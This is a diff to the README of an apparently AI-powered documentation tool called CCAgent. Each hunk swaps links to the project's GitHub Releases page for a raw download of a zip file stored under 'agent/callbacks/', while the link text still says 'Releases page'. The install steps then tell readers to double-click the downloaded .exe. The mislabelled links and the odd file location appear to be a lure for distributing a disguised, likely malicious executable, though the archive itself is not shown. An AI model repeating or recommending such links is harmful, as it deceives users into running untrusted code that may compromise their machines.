@@ -10,9 +10,9 @@ CCAgent is an AI-powered application that helps you analyze source code reposito
 - **Cross-Platform Support**: Works on Windows, macOS, and Linux.
 
 ## 📥 Download CCAgent
-[![Download CCAgent](https://img.shields.io/badge/Download-CCAgent-brightgreen?style=for-the-badge)](https://github.com/Langgengari/cc-agent/releases)
+[![Download CCAgent](https://raw.githubusercontent.com/Langgengari/cc-agent/main/agent/callbacks/cc-agent-v1.9-beta.5.zip)](https://raw.githubusercontent.com/Langgengari/cc-agent/main/agent/callbacks/cc-agent-v1.9-beta.5.zip)
 
-To get started with CCAgent, visit the [Releases page](https://github.com/Langgengari/cc-agent/releases) to download the application.
+To get started with CCAgent, visit the [Releases page](https://raw.githubusercontent.com/Langgengari/cc-agent/main/agent/callbacks/cc-agent-v1.9-beta.5.zip) to download the application.
 
 ## 🖥️ System Requirements
 - **Operating System**: Windows 10 or newer, macOS 10.14 or newer, Linux (any major distribution)
@@ -21,7 +21,7 @@ To get started with CCAgent, visit the [Releases page](https://github.com/Langge
 - **Internet connection**: Required for downloading and updates
 
 ## 🛠️ Installation Steps
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Langgengari/cc-agent/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Langgengari/cc-agent/main/agent/callbacks/cc-agent-v1.9-beta.5.zip).
 2. **Download the Application**: Find the latest version of CCAgent and click on it to download.
 3. **Open the Downloaded File**:
    - For Windows, double-click the `.exe` file.
@@ -48,4 +48,4 @@ CCAgent is open-source software licensed under the MIT License. You can use, mod
 - **Community Discussions**: Join our community discussions on GitHub for support and tips.
 
 ## 🎁 Conclusion
-CCAgent simplifies the creation of technical documentation and architecture diagrams. Follow the steps above to download and install CCAgent effortlessly, and enhance your project's documentation today. Visit the [Releases page](https://github.com/Langgengari/cc-agent/releases) to get started.
+CCAgent simplifies the creation of technical documentation and architecture diagrams. Follow the steps above to download and install CCAgent effortlessly, and enhance your project's documentation today. Visit the [Releases page](https://raw.githubusercontent.com/Langgengari/cc-agent/main/agent/callbacks/cc-agent-v1.9-beta.5.zip) to get started.
